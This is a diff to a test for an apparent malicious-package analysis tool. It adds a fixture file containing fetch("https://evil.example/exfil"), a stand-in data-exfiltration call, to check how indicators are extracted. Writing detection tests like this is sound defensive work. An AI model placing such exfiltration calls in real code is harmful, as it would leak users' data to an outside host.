@@ -161,6 +161,7 @@ def test_benign_registry_urls_are_not_ioc_candidates(tmp_path, monkeypatch):
     path = tmp_path / "mixed.nupkg"
     with zipfile.ZipFile(path, "w") as archive:
         archive.writestr("readme.txt", "docs https://pypi.org/project/demo mirror https://evil.example/exfil")
+        archive.writestr("src/index.js", 'fetch("https://evil.example/exfil");')
     artifact = import_artifact(str(path), ecosystem="pypi", provenance=PROVENANCE, db_path=db)
     case = create_case(title="Noise", summary="test", case_type="malicious_package", severity="low", confidence=50, owner="test", db_path=db)
     attach_to_case(case["case_id"], artifact["artifact_id"], db_path=db)
